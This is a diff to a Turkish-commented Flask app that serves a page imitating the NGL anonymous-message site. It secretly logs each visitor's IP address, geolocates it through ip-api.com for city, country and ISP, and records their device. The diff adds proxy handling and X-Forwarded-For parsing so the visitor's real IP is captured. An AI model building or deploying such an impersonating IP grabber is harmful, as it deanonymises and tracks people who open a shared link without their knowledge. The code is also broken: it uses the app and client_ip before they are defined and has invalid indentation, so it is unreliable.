@@ -2,7 +2,11 @@ from flask import Flask, request, render_template_string, redirect
 import datetime
 import logging
 import requests  # IP'den konum çekmek için
+from werkzeug.middleware.proxy_fix import ProxyFix
 
+# ... (mevcut import'lar)
+
+app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1, x_prefix=1)
 app = Flask(__name__)
 
 # Log dosyamız
@@ -101,11 +105,23 @@ NGL_HTML = """
 </body>
 </html>
 """
-
+try:
+    geo = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=5).json()
+    if geo.get('status') == 'success':
+        location = f"{geo.get('city', 'Bilinmiyor')}, {geo.get('countryCode', 'Bilinmiyor')}"
+        isp = geo.get('isp', 'Bilinmiyor')
+    else:
+        location = "Konum alınamadı"
+        isp = "Bilinmiyor"
+except Exception as e:
+    location = "Konum alınamadı"
+    isp = "Bilinmiyor"
+  
 @app.route('/<username>', methods=['GET', 'POST'])
 def ngl_page(username):
-    client_ip = request.remote_addr
-    user_agent = request.headers.get('User-Agent')
+   client_ip = request.remote_addr
+    if 'X-Forwarded-For' in request.headers:
+    client_ip = request.headers['X-Forwarded-For'].split(',')[0].strip()  # İlk IP genellikle gerçek client
     
     # IP'den konum çek (ücretsiz API)
     try:
@@ -126,8 +142,8 @@ def ngl_page(username):
         return render_template_string(NGL_HTML, username=username, success=True)
     
     # Sayfa ilk açıldığında da logla (kim tıkladığını bilelim)
-    view_log = f"SAHNE GÖRÜNTÜLENDİ: @{username} | IP: {client_ip} | KONUM: {location} | CİHAZ: {user_agent[:100]}"
-    logging.info(view_log)
+    #view_log = f"SAHNE GÖRÜNTÜLENDİ: @{username} | IP: {client_ip} | KONUM: {location} | CİHAZ: {user_agent[:100]}"
+    #logging.info(view_log)
     
     return render_template_string(NGL_HTML, username=username, success=False)
 
